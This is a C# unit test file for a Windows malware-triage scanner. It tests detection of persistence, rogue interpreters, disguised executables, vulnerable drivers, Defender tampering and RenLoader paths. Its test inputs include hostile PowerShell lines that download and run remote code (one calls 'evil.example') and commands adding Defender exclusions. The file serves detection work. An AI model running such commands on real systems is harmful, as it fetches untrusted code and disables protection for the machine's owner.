using System;
using System.Collections.Generic;
using System.Linq;
using Spor.Modules;
using Xunit;

namespace Spor.Tests
{
    /// <summary>
    /// Spor 0.8.1: what the review of eleven 0.8.0 logs (November 2026) found missed or noisy, as pure checks with the strings of those
    /// logs (user names changed): persistence that runs code, interpreters where none is installed, signed decoys, Defender settings,
    /// repeated SUMMARY findings, downloads of the helper's own tools, installer batches, USB false alarms.
    /// </summary>
    public class LogReviewTests
    {
        const string Win = @"C:\Windows";

        static Func<string, bool> Exists(params string[] files) => p => files.Contains(p, StringComparer.OrdinalIgnoreCase);

        // ---------------- Cmd.Program ----------------

        [Fact]
        public void ADevicePrefixedServicePathIsTheFile() =>
            Assert.Equal(@"C:\ProgramData\prndata..\prn.exe", Cmd.Program(@"\\?\C:\ProgramData\prndata..\prn.exe", Win, Exists()));

        [Fact]
        public void ABarePowershellIsFoundInWindowsPath()
        {
            var ps = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            Assert.Equal(ps, Cmd.Program("powershell", Win, Exists(ps)));
            Assert.Equal(ps, Cmd.Program("powershell.exe -nop -c x", Win, Exists(ps)));
            Assert.Equal("powershell", Cmd.Program("powershell", Win, Exists()));   // not found: as written
        }

        [Fact]
        public void AnUnquotedPathWithBlanksIsNotCutAtTheFirstBlank()
        {
            // the file is gone: up to the first switch, never "C:\Program"
            Assert.Equal(@"C:\Program Files\Proton\VPN\Callout Driver", Cmd.Program(@"C:\Program Files\Proton\VPN\Callout Driver", Win, Exists()));
            Assert.Equal(@"C:\Program Files\Foo\bar", Cmd.Program(@"C:\Program Files\Foo\bar -k netsvcs", Win, Exists()));
            Assert.Equal("-k netsvcs", Cmd.Args(@"C:\Program Files\Foo\bar -k netsvcs", Exists()));
            // the file is there: where Windows finds it
            Assert.Equal(@"C:\Program Files\Foo\bar.exe", Cmd.Program(@"C:\Program Files\Foo\bar arg", Win, Exists(@"C:\Program Files\Foo\bar.exe")));
            Assert.Equal("arg", Cmd.Args(@"C:\Program Files\Foo\bar arg", Exists(@"C:\Program Files\Foo\bar.exe")));
        }

        // ---------------- commands that run code ----------------

        [Theory]
        [InlineData("-cOmma Add-MpPreference -ExclusionPath (Get-Location) -Force")]
        [InlineData("-nop -Command \"& ([scriptblock]::Create((Invoke-RestMethod 'evil.example' -TimeoutSec 30)))\"")]
        [InlineData("\"C:\\ProgramData\\OneDriveUSOShared\\RealtekCampos.py\"")]
        [InlineData("-w hidden -c \"irm https://example.com/a | iex\"")]
        public void ArgumentsThatRunCode(string args) => Assert.True(Rules.ArgsRunCode(args), args);

        [Theory]
        [InlineData("-ExecutionPolicy Bypass -File \"C:\\Program Files\\Dell\\Update\\task.ps1\"")]
        [InlineData("/RunOnAC EngagedRebootReminder")]
        [InlineData("-background")]
        [InlineData("")]
        public void ArgumentsThatDoNot(string args) => Assert.False(Rules.ArgsRunCode(args), args);

        [Fact]
        public void ADefenderExclusionByCommandIsSuspiciousEverywhere() =>
            Assert.True(Rules.ArgsSuspicious("-c Add-MpPreference -ExclusionProcess x.exe"));

        [Theory]
        [InlineData("Invoke-Expression \"docker ps\"", false)]
        [InlineData("Invoke-Expression $payload", true)]
        [InlineData("Invoke-Expression \"$(Get-Content x.txt)\"", true)]
        [InlineData("curl http://127.0.0.1:4040/api/tunnels", false)]
        [InlineData("curl http://localhost:8080/x", false)]
        [InlineData("curl https://example.com/a.ps1 -o a.ps1", true)]
        [InlineData("irm https://get.example.com | iex", true)]
        [InlineData("IEX (New-Object Net.WebClient).DownloadString('https://example.com')", true)]
        public void PowerShellHistoryLines(string line, bool suspicious) => Assert.Equal(suspicious, Rules.PsSus.IsMatch(line));

        // ---------------- interpreters, names, paths ----------------

        [Theory]
        [InlineData(@"C:\Windows\System32\MicrosoftHealthCheckerV1-atwbpi\node.exe", false, true)]
        [InlineData(@"C:\ProgramData\OneDriveUSOShared\pythonw.exe", false, true)]
        [InlineData(@"C:\Users\Isa\AppData\Local\Temp\modules\BeciComponent\pythonw.exe", false, true)]
        [InlineData(@"C:\ProgramData\anaconda3\python.exe", true, false)]   // an all-users install has its uninstaller
        [InlineData(@"C:\Users\anna\AppData\Local\Programs\Python\Python312\python.exe", false, false)]
        [InlineData(@"C:\Program Files\nodejs\node.exe", false, false)]
        [InlineData(@"C:\ProgramData\x\notepad.exe", false, false)]          // no interpreter
        [InlineData(@"C:\Windows\py.exe", false, false)]                     // the Python launcher
        [InlineData(@"C:\Windows\System32\java.exe", false, false)]
        public void InterpretersWhereNoneIsInstalled(string path, bool uninstaller, bool outside) =>
            Assert.Equal(outside, Rules.InterpreterOutside(path, Win, _ => uninstaller));

        [Fact]
        public void AFolderEndingWithADotIsFlagged()
        {
            Assert.Contains(Rules.InvisibleFlag, Rules.Flags(@"C:\ProgramData\prndata..\prn.exe"));
            Assert.Contains(Rules.InvisibleFlag, Rules.Flags(@"C:\ProgramData\NULDATA..\SHELLEXPERIENCEHOST.EXE"));
            Assert.DoesNotContain(Rules.InvisibleFlag, Rules.Flags(@"C:\Program Files\Greenshot\Greenshot.exe"));
            Assert.DoesNotContain(Rules.InvisibleFlag, Rules.Flags(@"C:\Program Files\Vendor\bin\..\app.exe"));
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\Windows.Data.Pdf.dll", false)]
        [InlineData(@"C:\Program Files\Greenshot\Dapplo.Log.dll", false)]
        [InlineData(@"C:\Users\anna\Downloads\invoice.pdf.exe", true)]
        public void DoubleExtensions(string path, bool flagged) => Assert.Equal(flagged, Rules.DoubleExt(path));

        [Theory]
        [InlineData(@"C:\Users\Chad  joseph\kgw7Hp\kOsW3u0gxT\clip\S_Pipe.exe", "Setup.exe", true)]
        [InlineData(@"C:\Users\Chad  joseph\AppData\Local\Z0533B4Lo\MVg4zIU\clip\S_Pipe.exe", "Setup.exe", true)]
        [InlineData(@"C:\Users\anna\AppData\Local\Discord\Update.exe", "Squirrel.exe", false)]   // no random folder
        [InlineData(@"C:\Users\anna\kgw7Hp\kOsW3u0gxT\clip\Setup.exe", "Setup.exe", false)]       // its own name
        public void SignedDecoysStartedByPersistence(string path, string original, bool decoy) =>
            Assert.Equal(decoy, Names.RenamedPersisted(path, original, null, null));

        // ---------------- drivers ----------------

        [Fact]
        public void TheVulnerableDriverListLoads()
        {
            Assert.Contains("iqvw64e.sys", Rules.VulnerableDrivers);
            Assert.Contains("RTCORE64.SYS", Rules.VulnerableDrivers);   // case-insensitive
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\drivers\iqvw64e.sys", "!vulnerable-driver")]
        [InlineData(@"C:\Only for\CH32\iqvw64.sys", "!vulnerable-driver")]
        [InlineData(@"C:\Windows\System32\drivers\ksllxnqs.sys", "!random-name")]
        [InlineData(@"C:\Windows\System32\drivers\aavkswsq.sys", "!random-name")]
        public void DriversThatAreEvidence(string path, string flag) => Assert.Contains(flag, Rules.Flags(path));

        [Theory]
        [InlineData(@"C:\Windows\System32\drivers\lktrozkc.sys")]
        [InlineData(@"C:\Windows\System32\drivers\qhemhlne.sys")]
        [InlineData(@"C:\Windows\System32\drivers\ukvdwtqj.sys")]
        [InlineData(@"C:\Windows\System32\drivers\cvkznfzm.sys")]
        public void ARandomLowerCaseDriverName(string path) => Assert.Contains("!random-name", Rules.Flags(path));

        [Theory]
        [InlineData(@"C:\Windows\System32\drivers\mbam.sys")]
        [InlineData(@"C:\Windows\System32\drivers\mwac.sys")]
        [InlineData(@"C:\Windows\System32\DriverStore\FileRepository\nv.inf_amd64_1\nvlddmkm.sys")]
        [InlineData(@"C:\Windows\System32\drivers\dxgkrnl.sys")]
        [InlineData(@"C:\Windows\System32\drivers\kbdclass.sys")]
        [InlineData(@"C:\Windows\System32\drivers\farflt11.sys")]
        [InlineData(@"C:\Windows\System32\drivers\mssmbios.sys")]
        [InlineData(@"C:\Windows\System32\drivers\qwavedrv.sys")]
        [InlineData(@"C:\Windows\System32\drivers\athpexnt.sys")]
        [InlineData(@"C:\Windows\System32\drivers\storqosflt.sys")]
        [InlineData(@"C:\Windows\System32\drivers\vkrnlintvsc.sys")]
        [InlineData(@"C:\Windows\System32\drivers\rt640x64.sys")]
        [InlineData(@"C:\Windows\System32\drivers\e1d68x64.sys")]
        [InlineData(@"C:\Windows\System32\drivers\b57nd60a.sys")]
        [InlineData(@"C:\Program Files\Riot Vanguard\vgk.sys")]
        public void DriversThatAreNot(string path)
        {
            Assert.DoesNotContain("!vulnerable-driver", Rules.Flags(path));
            Assert.DoesNotContain("!random-name", Rules.Flags(path));
        }

        [Theory]
        [InlineData(@"C:\Program Files\Riot Vanguard\vgk.sys", true)]
        [InlineData(@"C:\ProgramData\CPUID Software\sdk\x.sys", true)]
        [InlineData(@"C:\Only for\CH32\iqvw64.sys", false)]
        [InlineData(@"C:\Users\a\AppData\Local\Temp\HWiNFO_x64_215.sys", false)]
        [InlineData(@"C:\ProgramData\x.sys", false)]
        public void OnlyAnInstallFolderCanQuietATrustedDriver(string path, bool install) => Assert.Equal(install, Rules.InInstallFolder(path));

        // ---------------- context ----------------

        [Fact]
        public void ContextFlagsAreNoEvidence()
        {
            foreach (var f in Rules.Info)
            {
                Assert.Empty(Rules.Strong(new List<string> { f }));
                Assert.Contains(Rules.FlagLegend, l => l.StartsWith(f + " = context:"));
            }
            Assert.Equal(new[] { "!sideload" }, Rules.Strong(new List<string> { "!new-service", "!sideload", "!lolbin" }));
        }

        // ---------------- Defender ----------------

        [Theory]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x5", false)]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x1", false)]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4", true)]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x0", true)]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1", true)]
        [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x0", false)]
        public void ProtectionTurnedOff(string value, bool off) => Assert.Equal(off, Security.DefenderOff(value));

        [Fact]
        public void TheFileOfADetectionItem()
        {
            Assert.Equal(@"C:\x\a.zip", Security.DetectedPath(@"C:\x\a.zip->inner.exe"));
            Assert.Equal(@"C:\x\b.exe", Security.DetectedPath(@"C:\x\b.exe, pid:5:123"));
        }

        [Fact]
        public void AnMpLogLineOfAnEventDetectionIsNoSecondTimelineLine()
        {
            var events = new List<(DateTime, string)> { (new DateTime(2026, 11, 21, 17, 54, 51), "Trojan:Win32/Qwexlafiba!rfn") };
            var line = "DETECTIONEVENT MPSOURCE_REALTIME Trojan:Win32/Qwexlafiba!rfn file:C:\\Windows\\Installer\\62b11e4.msi;";
            Assert.True(Security.SameAsEvent(new DateTime(2026, 11, 21, 17, 55, 30), line, events));
            Assert.False(Security.SameAsEvent(new DateTime(2026, 11, 21, 19, 0, 0), line, events));
            Assert.False(Security.SameAsEvent(new DateTime(2026, 11, 21, 17, 55, 30), "DETECTIONEVENT Trojan:Win32/Other", events));
        }

        // ---------------- SUMMARY ----------------

        [Fact]
        public void ARepeatedFindingIsOneLine()
        {
            var times = new List<DateTime> { new DateTime(2026, 10, 30, 2, 11, 27), new DateTime(2026, 10, 31, 2, 22, 38), new DateTime(2026, 11, 1, 2, 37, 47) };
            Assert.Equal(@"service installed: wsftprm: C:\x.sys [gone] => +2 more times since 2026-10-30 02:11",
                         Scanner.Repeated(@"service installed: wsftprm: C:\x.sys [gone]", times));
            Assert.Equal("Defender detected: X => process C:\\a.exe; +2 more times since 2026-10-30 02:11",
                         Scanner.Repeated("Defender detected: X => process C:\\a.exe", times));
            Assert.Equal("installed program X => RenLoader: y; +2 more times since 2026-10-30 02:11 <==== !known-malware",
                         Scanner.Repeated("installed program X => RenLoader: y <==== !known-malware", times));
            Assert.Equal("once", Scanner.Repeated("once", times.Take(1).ToList()));
        }

        // ---------------- downloads ----------------

        [Fact]
        public void TheSameFileFromTheSamePageIsOneDownload()
        {
            Assert.Equal(Downloads.SameDownload(@"C:\Users\a\Downloads\movie_library.py", "https://claude.ai/chat/1"),
                         Downloads.SameDownload(@"C:\Users\a\Downloads\movie_library (7).py", "https://claude.ai/chat/2"));
            Assert.NotEqual(Downloads.SameDownload(@"C:\Users\a\Downloads\movie_library.py", "https://claude.ai/chat/1"),
                            Downloads.SameDownload(@"C:\Users\a\Downloads\movie_library.py", "https://example.com/"));
        }

        [Fact]
        public void TheHelpersOwnToolsAreNoFinding()
        {
            var frst = "https://download.bleepingcomputer.com/dl/abc/windows/security/security-utilities/f/farbar-recovery-scan-tool/FRST64.exe";
            Assert.True(Downloads.OwnTool(@"C:\Users\a\Downloads\FRST64.exe", frst, @"C:\Tools\Spor.exe", ""));
            Assert.False(Downloads.OwnTool(@"C:\Users\a\Downloads\FRST64.exe", "https://example.com/FRST64.exe", @"C:\Tools\Spor.exe", ""));
            Assert.True(Downloads.OwnTool(@"C:\Tools\Spor.exe", "https://example.com/Spor.exe", @"C:\Tools\Spor.exe", ""));
            // a Spor.exe that is gone (moved after the download): this tool
            Assert.True(Downloads.OwnTool(@"C:\Users\a\Downloads\nowhere-" + Guid.NewGuid().ToString("N") + @"\Spor (1).exe", "https://example.com/x", "", ""));
            Assert.False(Downloads.OwnTool(@"C:\Users\a\Downloads\setup.exe", frst, "", ""));
        }

        [Fact]
        public void ABlobAddressKeepsItsKindNotItsScheme()
        {
            Assert.Equal("blob:claude.ai/0a1b", Downloads.Host("blob:https://claude.ai/0a1b"));
            Assert.Equal("example.com/a.zip", Downloads.Host("https://example.com/a.zip?x=1"));
        }

        // ---------------- installers, timestamps, drives ----------------

        [Fact]
        public void AnInstallersFilesWithOneCreationSecondAreOneLine()
        {
            var b = new DateTime(2025, 3, 1, 10, 0, 0);
            var files = new List<(string, DateTime)>
            {
                (@"C:\Lenovo\Addins\a.dll", b), (@"C:\Lenovo\Addins\b.dll", b.AddMilliseconds(400)), (@"C:\Lenovo\Addins\c.dll", b),
                (@"C:\Lenovo\Addins\d.dll", b.AddSeconds(5)), (@"C:\Other\e.exe", b),
            };
            var batches = Timestomp.Batches(files);
            Assert.Contains(batches, g => g.Count == 3);
            Assert.Equal(3, batches.Count);
        }

        [Theory]
        [InlineData(@"C:\$SysReset\Scratch\UdiApiScratch\metadata\a.dll", true)]
        [InlineData(@"C:\$WINDOWS.~BT\Sources\a.dll", true)]
        [InlineData(@"C:\Windows\Logs\CBS\CbsPersist_20261101.cab", true)]
        [InlineData(@"C:\Users\anna\AppData\Local\Temp\a.exe", false)]
        public void WindowsStagingFolders(string path, bool staging) => Assert.Equal(staging, Timestomp.WindowsStaging.IsMatch(path));

        [Theory]
        [InlineData(@"C:\Users\a\AppData\Local\Kingsoft\WPS Office\12.2\office6\addons\x.dll", @"C:\Users\a\AppData\Local\Kingsoft\WPS Office")]
        [InlineData(@"C:\Program Files\Lenovo\Vantage\Addins\x.dll", @"C:\Program Files\Lenovo")]
        [InlineData(@"D:\Games\x\y.exe", @"D:\Games\x")]
        public void InstallRoots(string path, string root) => Assert.Equal(root, Files.InstallRoot(path));

        [Fact]
        public void WinSxsDeltasAreWindowsFiles()
        {
            Assert.Matches(ExecEvidence.WinSxsDelta, @"C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.26100.1_none_x\f\powershell.exe");
            Assert.DoesNotMatch(ExecEvidence.WinSxsDelta, @"C:\Windows\WinSxS\amd64_x\powershell.exe");
        }

        [Fact]
        public void TheRecycleBinIsNoDisguise()
        {
            Assert.True(Usb.RecycleBinIni(@"N:\$RECYCLE.BIN\S-1-5-21-1-2-3-1001\desktop.ini", "{645FF040-5081-101B-9F08-00AA002F954E}"));
            Assert.False(Usb.RecycleBinIni(@"N:\Photos\desktop.ini", "{645FF040-5081-101B-9F08-00AA002F954E}"));
            Assert.True(Usb.InWindowsHiddenFolder(@"N:\System Volume Information\tracking.log"));
            Assert.False(Usb.InWindowsHiddenFolder(@"N:\RECYCLER\x.exe"));
        }

        [Fact]
        public void ALeadingSpaceIsNoSpaceAtTheEnd()
        {
            Assert.StartsWith("name starts with a space", Usb.EdgeNote(" Dawn of Justice.mp4"));
            Assert.StartsWith("name ends with a space or dot", Usb.EdgeNote("x."));
        }

        // ---------------- Autodetect: the corrected rules ----------------

        static readonly Autodetect.Db Db = Autodetect.Parse(Autodetect.Embedded());

        static bool RenLoader(string path) => Db.Match("path", path).Any(p => p.Family == "RenLoader");

        [Theory]
        [InlineData(@"J:\Misc\Misc Games\Project_Exhibitionist_[v1.2.0_Steam]_[uw_Archive_win_2058\Setup.exe", true)]
        [InlineData(@"C:\Users\a\Downloads\MOMDOWS_PRIVATE_NTR_SESSION_[SESSION_2]__ARCHIVE_WIN64_5051\SETUP.EXE", true)]
        [InlineData(@"C:\Users\a\Downloads\Archive_win64_496289.zip", true)]
        [InlineData(@"C:\ProgramData\logger_crypto_v2\QVWBTNOQGTUKTGVZLJKSBQ\Ru_Grid16.exe", true)]
        [InlineData(@"C:\ProgramData\DRVengine_nano\Ru_Grid16.exe", true)]
        [InlineData(@"C:\Backups\Archive_2023\photos.zip", false)]
        [InlineData(@"C:\ProgramData\logger_crypto_v2\Plugins\lib\x.exe", false)]
        public void CorrectedRenLoaderRules(string path, bool hit) => Assert.Equal(hit, RenLoader(path));
    }
}
